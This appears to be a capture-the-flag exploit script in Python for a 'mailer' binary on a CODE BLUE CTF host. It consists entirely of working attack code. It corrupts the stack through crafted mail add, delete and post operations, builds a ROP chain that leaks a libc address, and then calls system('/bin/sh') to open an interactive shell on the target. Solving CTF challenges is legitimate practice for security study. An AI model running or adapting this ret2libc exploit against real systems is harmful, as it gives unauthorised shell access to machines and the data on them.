#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './mailer'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'sms.tasks.ctf.codeblue.jp', 'port':6029})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6_mailer')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_main           = 0x08048bd0

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    mail = Mailer(conn)

    rop = ROP(binf)
    rop.printf(addr_got_main)
    rop.call(addr_main)

    stackbof(mail, str(rop))

    conn.recvuntil(':)\n')
    addr_libc_main = u32(conn.recv(4))
    libc.address        = addr_libc_main - offset_libc_main
    info('addr_libc_base = 0x%08x' % libc.address)
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(binf)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    stackbof(mail, str(rop))

def stackbof(mail, exploit):
    mail.add('0')
    mail.add('1')
    mail.add('2')
    mail.add('3')
    mail.add('4')

    mail.delete(0)
    mail.delete(1)
    mail.delete(2)
    mail.post(4, -15)

    mail.add('a'*0x84)
    mail.add(p32(0xcafebebe) + exploit)

    mail.post(0, 0)
    mail.post(0, 0)
    mail.post(1, 0)

    mail.quit()

class Mailer:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, content):
        self.sendlineafter('> ', '1')
        self.sendlineafter('contents: ', content)

    def delete(self, id):
        self.sendlineafter('> ', '2')
        self.sendlineafter('ID (0-4): ', str(id))
        
    def post(self, id, filter):
        self.sendlineafter('> ', '3')
        self.sendlineafter('ID (0-4): ', str(id))
        self.sendlineafter('> ', str(filter))

    def quit(self):
        self.sendlineafter('> ', '4')
        
#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
